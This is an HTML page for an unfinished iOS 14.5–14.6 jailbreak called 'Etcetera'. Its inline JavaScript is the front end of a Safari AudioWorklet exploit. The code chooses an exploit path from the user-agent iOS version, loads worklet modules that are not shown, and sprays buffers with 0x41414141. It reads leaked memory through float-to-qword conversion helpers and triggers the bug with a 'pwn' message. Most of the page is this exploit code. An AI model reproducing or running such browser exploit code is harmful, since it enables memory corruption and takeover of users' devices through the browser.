<!DOCTYPE html>
<head>
	<meta charset='UTF-8'>
	<meta name="viewport" content="width=device-width, initial-scale=1">	
	<title>Kanji // Etcetera</title>		
	<link rel='stylesheet' href='css/style.css'>  
	<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js'></script>
	<script src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.2/jquery-ui.min.js'></script>
	<script type="text/javascript">
		var alerted = localStorage.getItem('alerted') || '';
		if (alerted != 'yes') {
			alert("Hi! This is Etcetera.\n\nA WIP project that I want to finish since Manticore didn't.\n\nAs of right now, only the AudioWorklet exploit is implemented.\n\nI am a beginner in the jailbreak scene so it will take some time before this is in full working order.\n\nPressing the 'jailbreak' button will only run the AudioWorklet exploit. Nothing else will happen.");
		 localStorage.setItem('alerted','yes');
		}
	</script>
</head>
<body>
	<div class="content">
		<script type="text/javascript" src="index.js"></script>
		<div class="header" onclick="slideEasterEgg();">
			<h1>Etcetera // „Åù„ÅÆ‰ªñ</h1>
			<h5>For iOS 14.5 - 14.6</h5>
			<h5>Subject to change | Needs Kernel Exploit</h5>
			<h5>Created by <a href="https://twitter.com/rpwnage" style="color: #ff00ff;">rpwnage</a></h5>
			<h5>WIP and Hopefully Finished By <a href="https://twitter.com/kanjishere" style="color: #ff00ff;">Kanji</a> x <a href="https://twitter.com/turnerhackz1" style="color: #ff00ff;">turnerhackz1</a></h5>
		</div>
		<div id="interact" style="width: 100%;">
			
    <div id="slider">
        <div id="well">
            <div id="thumbtack">
                <img class="arrow" src="images/arrow.png" alt="arrow">
            </div>
            <div id="hint">
                <span>Slide To Jailbreak</span>
            </div>
        </div>
    </div>
			<script type="text/javascript" src="slider.js"></script>
			<script>
				window.go = function() {
				var enumur = 0;
				if(window.location.protocol != "https:") {
        			window.location.protocol = "https";
				}

				var devices = (/iPhone|iPad|iPod/i);
				//switch(currentFirmware(navigator.userAgent)
				if (currentFirmware(navigator.userAgent).startsWith("14.0")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.1")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.2")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.3")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.4")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.5")) 
				{
    					//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
					enumur = 1;
  				} else if (currentFirmware(navigator.userAgent).startsWith("14.6")) 
					{
						//document.getElementById("jbButton").innerHTML = "Jailbreak üîìüì±";
						enumur = 2;
					} else {
							//document.getElementById("jbButton").innerHTML = "Unsupported: iOS " + currentFirmware(navigator.userAgent) + "üì±üò¢";
							enumur = 2
					} 
				
      
				function log(s) {
					//alert(s);
        			document.body.innerText += s + "\n";
      				}
				function start () {
					if (enumur == 2) 
					{
						async function start1() 
						{
        						log(" starting...")
        						var context = new OfflineAudioContext(1, 128, 300000);
        						context.audioWorklet.addModule("14.6.js").then(async () => 
							{
          						var wa = new AudioWorkletNode(context, "a");
          						var wb = new AudioWorkletNode(context, "b");
          						wa.port.onmessage = (e) => { log(e.data);}
          						await (new Promise((res) => setTimeout(res, 100)));
          						wa.port.postMessage("pwn");
          						//wb.port.div(d);
        						});
						} 
						start1();
						} 
					if(enumur == 1) {
	let data_view = new DataView(new ArrayBuffer(8));
        floatAsQword = float => {
            data_view.setFloat64(0, float, true);
            var low = data_view.getUint32(0, true);
            var high = data_view.getUint32(4, true);
            return low + high * 0x100000000;
        }

        qwordAsFloat = qword => {
            data_view.setUint32(0, qword%0x100000000, true);
            data_view.setUint32(4, qword/0x100000000, true);
            //data_view.setBigUint64(0, qword);
            return data_view.getFloat64(0);
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        async function main(){
            log("Who does pwn my safari?");
            let audioCtx = new OfflineAudioContext(1,0x100000,44100);
		//new OfflineAudioContext({numberOfChannels: 1, length: 0x100000, sampleRate: 44100});

            let outputBufferSrc = new ConvolverNode(audioCtx);
            let inputBufferSrc = new AudioBufferSourceNode(audioCtx);
            let outputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            let inputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);

            outputBufferSrc.buffer = outputBuffer;
            inputBufferSrc.loop = true;
            inputBufferSrc.buffer = inputBuffer;
            let outputBufferU32 = new Uint32Array(outputBuffer.getChannelData(0).buffer);
            let inputBufferU32 = new Uint32Array(inputBuffer.getChannelData(0).buffer);

            inputBufferU32.fill(0x41414141);

            //console.log("1234")
            await audioCtx.audioWorklet.addModule("14.5.js");
            //alert();
            //await sleep(1000);
            let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
            let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
            //return 0;
            let source = new AudioBufferSourceNode(audioCtx);
            let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            await sleep(500);
            //alert();
            let is_leak = true;
            originNode2.port.onmessage = async (e)=>{
                if(e.data == "retry"){
                    //print(e.data);
                    //await sleep(2000);
                    location.reload();
                    return;
                }
                if(!is_leak){
                    //console.log(e.data.toString(16));
                    log(e.data);
                    return;
                }

                var leak = e.data;

                for(var i = 0; i < leak.length; i ++){
                    if(leak[i] != 0)
                        (`[${i}] : ` + floatAsQword(leak[i]).toString(16));
                }
                is_leak = false;
                //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
                //console.log("suspend");
            }
            //
            originNode.connect(audioCtx.destination);
            /*
            inputBufferSrc.connect(originNode)
            .connect(outputBufferSrc)
            .connect(audioCtx.destination);
            */
            //originNode2.connect(audioCtx.destination);
            await audioCtx.startRendering();

            //alert("fuck");

        }
        //alert();
        //alert(window.OfflineAudioContext);
        main();
					}
	}
					start();
}
</script>	
</body>
</html>
